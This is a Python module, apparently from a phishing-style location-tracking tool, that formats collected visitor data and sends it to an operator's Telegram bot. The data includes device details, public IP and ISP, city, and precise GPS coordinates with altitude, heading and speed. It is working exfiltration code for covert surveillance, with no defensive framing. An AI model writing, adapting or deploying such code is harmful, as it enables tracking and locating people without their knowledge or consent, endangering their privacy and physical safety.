import utils
import requests
from json import dumps, loads

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow


def send_request(token, msg):
    api_url = f'https://api.telegram.org/bot{token[0]}:{token[1]}/sendMessage'
    api_params = {
        'chat_id': token[2],
        'text': msg,
        'parse_mode': 'MarkdownV2'
    }
    rqst = requests.get(api_url, params=api_params, timeout=10)
    if rqst.status_code != 200:
        utils.print(f'{R}[-] {C}Telegram :{W} [{rqst.status_code}] {loads(rqst.text)["description"]}\n')


def tgram_sender(msg_type, content, token):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = f"""
*设备信息*

```
操作系统   : {json_content['os']}
平台       : {json_content['platform']}
浏览器     : {json_content['browser']}
GPU 供应商 : {json_content['vendor']}
GPU        : {json_content['render']}
CPU 核心   : {json_content['cores']}
内存       : {json_content['ram']}
公网 IP    : {json_content['ip']}
分辨率     : {json_content['ht']}x{json_content['wd']}
```"""
        send_request(token, info_message)

    if msg_type == 'ip_info':
        ip_message = f"""
*IP 信息*

```
大洲      : {json_content['continent']}
国家      : {json_content['country']}
地区      : {json_content['region']}
城市      : {json_content['city']}
组织      : {json_content['org']}
ISP       : {json_content['isp']}
```
"""
        send_request(token, ip_message)

    if msg_type == 'location':
        loc_message = f"""
*位置信息*

```
纬度      : {json_content['lat']}
经度      : {json_content['lon']}
精度      : {json_content['acc']}
海拔      : {json_content['alt']}
方向      : {json_content['dir']}
速度      : {json_content['spd']}
```
"""
        send_request(token, loc_message)

    if msg_type == 'url':
        url_msg = json_content['url']
        send_request(token, url_msg)

    if msg_type == 'error':
        error_msg = json_content['error']
        send_request(token, error_msg)
